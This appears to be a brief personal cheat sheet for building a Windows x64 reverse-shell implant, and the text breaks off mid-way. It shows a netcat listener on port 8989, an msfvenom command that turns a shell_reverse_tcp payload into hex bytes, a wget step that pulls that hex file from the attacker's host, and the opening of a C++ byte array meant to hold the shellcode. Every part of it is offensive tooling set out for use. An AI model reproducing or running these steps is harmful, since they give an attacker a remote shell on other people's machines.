# Shellcodes and commands

```shell
nc -lvnp 8989 # listeners with a hook
xxd
```

### Rev-shell - Win_x64 - IP=192.168.200.129:8989

```shell
ip addr show
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f hex | sed 's/../0x&, /g' > rev_shell.hex.txt
# cat rev_shell.hex.txt
...
```cmd
# powershell
wget <HOST>:<PORT>/rev_shell.hex.txt
```

```cpp
const byte rev_shell[] = {
